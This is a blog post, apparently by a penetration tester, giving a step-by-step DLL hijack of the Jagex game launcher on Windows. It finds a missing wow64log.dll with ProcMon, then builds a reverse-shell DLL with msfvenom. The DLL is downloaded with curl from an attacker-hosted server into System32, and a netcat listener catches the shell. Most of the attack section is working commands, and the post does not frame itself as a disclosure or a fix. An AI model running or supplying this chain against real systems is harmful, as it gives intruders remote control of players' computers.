[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F819599165822&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40xNEED%2Fdll-hijacking-jagexlauncher-819599165822&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40xNEED%2Fdll-hijacking-jagexlauncher-819599165822&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# DLL Hijacking JagexLauncher

[![Need](https://miro.medium.com/v2/resize:fill:88:88/1*Lg_6WaQ2dC170gE38v-B2w.png)](/%40xNEED?source=post_page---byline--819599165822--------------------------------)

[Need](/%40xNEED?source=post_page---byline--819599165822--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F9d52dd8156ab&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40xNEED%2Fdll-hijacking-jagexlauncher-819599165822&user=Need&userId=9d52dd8156ab&source=post_page-9d52dd8156ab--byline--819599165822---------------------post_header-----------)

4 min read·May 3, 2024

--

Listen

Share

A misadventure of learning via games

I have been an avid Runescape player for decades at this point and a couple of years back [Jagex](https://www.jagex.com/en-GB/) started trying to have some ownership of the security over people's accounts by advocating for an all-in-one launching platform called “Jagex Launcher”.

![]()

JagexLauncher

This is a fantastic idea for consumers “gamers” and makes things more manageable for the company for troubleshooting and recovery of accounts due to making the logins utilizing emails, not usernames anymore.

But what about from a security standpoint, does this make things more secure for the end user? We will find out, not so much.

## Download JagexLauncher

First, you must download the JagexLauncher from the Jagex website for Windows.

```
“https://www.jagex[.]com/en-GB/launcher”
```
![]()

Jagex Launcher for Windows

## Download ProcMon

Next, download ProcMon from Microsoft

```
"https://learn.microsoft[.]com/en-us/sysinternals/downloads/procmon"
```
![]()

ProcMon download via Microsoft

## Setup ProcMon

Now, start-up and setup ProcMon

Select the *filters* tab

![]()

Select the “filters” tab

Utilize the filters

```
Process Name is JagexLauncher.exe include
Result is NAME NOT FOUND include
Path ends with .dll include
```
![]()

Specified filters to use

## Observe JagexLauncher behavior with ProcMon

Now let’s check out JagexLauncher.exe while ProcMon is running

We can see that there is a **LOT** of DLLs that do not exist

![]()

multiple DLLs that do not exist

We will be taking a look at “*C:\Windows\System32\wow64log.dll*”

> Keep in mind that since we see “Program Files (x86)” we know that his a 64-bit device.

Spin up your attack box, like Kali, and grab your local host IP, which is “*192.168.153.136*”

```
ifconfig
```
![]()

Local host IP using “ifconfig”

## Create your MSFVENOM payload

Now we have to create our MSFVenom payload, keep in mind you can use other methods but this is fine since we aren’t using a C2 like Sliver, or Cobalt Strike which have their separate internal processes to create these payloads.
**It is important that when we create this DLL we name it “*wow64log.dll*”**

```
sudo msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.153.136 LPORT=9500 > wow64log.dll
```
> If using meterpreter or staged payloads, change payload as needed. Also, change LHOST and LPORT as needed.

![]()

creating “wow64log.dll”

## Transfer DLL

Now, let’s get this DLL over to the host machine

**Attacker Box**On our Attacker Box, we will generate a Python HTTP Server to transfer

```
python3 -m http.server
```
> Since no port was specified, port “8000” will be used

![]()

**Victim Box**We will download the DLL to the file location on the Victim box using cURL.

```
curl http://192.168.153.136:8000/wow64log.dll --output C:\Windows\System32\wow64log.dll
```
> Remember, port 8000 is where the file is being hosted and to transfer the file to the “C:\Windows\System32\” file directory

**Confirm Placement**We now want to confirm that the file has been transferred to the location we desired. There are a million ways to do this but I will just check utilizing File Explorer

![]()

confirm the file placement of “wow64log.dll”

**Create a listener on Attack Box**Finally, we MUST set a listener on to catch the shell on execution or this was all for nothing.

```
nc -lvnp 9500
```
> Remember, set the port to 9500 or whatever port you put as LHOST in the MSFVENOM payload

![]()

Setup Listener on port 9500

## TIME FOR THE SUPERBOWL

Let’s launch this application *JagexLauncher.exe* and see if we won the Super Bowl!

BAM! We can see that it worked as planned and you can now do some basic enumeration, such as *whoami*

```
whoami
```
![]()

Successful DLL Hijack of JagexLauncher.exe

## Resources

```
JagexLauncher -> "https://www.jagex[.]com/en-GB/launcher"
ProcMon -> "https://learn.microsoft[.]com/en-us/sysinternals/downloads/procmon"
Metasploit MSFVENOM
```
[Dll Hijacking](/tag/dll-hijacking?source=post_page-----819599165822--------------------------------)[Runescape](/tag/runescape?source=post_page-----819599165822--------------------------------)

--

--

[![Need](https://miro.medium.com/v2/resize:fill:96:96/1*Lg_6WaQ2dC170gE38v-B2w.png)](/%40xNEED?source=post_page---post_author_info--819599165822--------------------------------)[![Need](https://miro.medium.com/v2/resize:fill:128:128/1*Lg_6WaQ2dC170gE38v-B2w.png)](/%40xNEED?source=post_page---post_author_info--819599165822--------------------------------)Follow[## Written by Need](/%40xNEED?source=post_page---post_author_info--819599165822--------------------------------)[56 Followers](/%40xNEED/followers?source=post_page---post_author_info--819599165822--------------------------------)·[12 Following](/%40xNEED/following?source=post_page---post_author_info--819599165822--------------------------------)

Penetration Tester | Bug Bounty-er | Bang on stuff until it breaks

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----819599165822--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----819599165822--------------------------------)[About](/about?autoplay=1&source=post_page-----819599165822--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----819599165822--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----819599165822--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----819599165822--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----819599165822--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----819599165822--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----819599165822--------------------------------)[Teams](/business?source=post_page-----819599165822--------------------------------)

